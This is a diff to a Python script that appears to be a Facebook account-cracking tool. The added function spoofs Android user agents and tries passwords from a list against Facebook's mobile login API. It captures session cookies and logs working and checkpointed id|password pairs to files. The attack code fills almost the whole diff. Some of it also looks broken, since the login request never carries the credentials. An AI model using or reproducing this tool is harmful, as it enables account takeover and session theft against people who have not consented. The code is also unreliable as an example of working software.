@@ -1478,6 +1478,68 @@ def mbasic(idf, pwv):
         'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F',
         'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N',
         'SM-N960W', 'SM-N960X', 'SCV40'])
+    
+    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 200)) + '.0.0.' + str(random.randint(1, 66)) + '.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(mcc) + ';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    
+    cn = random.randint(60, 99)
+    
+    # Update progress
+    prog.update(des, description=f"[[bold green]B-API[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+    prog.advance(des)
+    
+    for ps in pwv:  # Iterate over password list
+        try:
+            session = requests.Session()
+            data = {
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            
+            headers = {
+                'Content-Length': f'''6{cn}'''
+            }
+            
+            q = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            
+            if 'session_key' in q:
+                cokii = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                Fanky = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
+                cookie = f'''sb={Fanky};{cokii}'''
+                tree = Tree(f"  ")
+                tree.add(f"[green]{idf}").add(f"[green]{ps}").add(f"[green]{ua}\n")
+                tree.add(f"[green]{cookie}\n")
+                cetak(tree)
+                open('OK/' + okc, 'a').write(idf + '|' + ps + '\n')
+            
+            if 'www.facebook.com' in q.get('error', {}).get('message', ''):
+                tree = Tree(f" ")
+                tree.add(f"[red]{idf}").add(f"[red]{ps}")
+                tree.add(f"[red]{ua}\n")
+                cetak(tree)
+                open('CP/' + cpc, 'a').write(idf + '|' + ps + '\n')
+                akun.append(idf + '|' + ps)
+            
+            loop += 1
+        
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    
+    return None
+    
+
+
+def mbasicvhbo(idf, pwv):
+    global loop, ok, cp
+    mcc = random.choice([
+        'SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU',
+        'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U',
+        'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880',
+        'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN',
+        'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F',
+        'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N',
+        'SM-N960W', 'SM-N960X', 'SCV40'])
 
     ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 200)) + '.0.0.' + str(random.randint(1, 66)) + '.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(mcc) + ';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
 
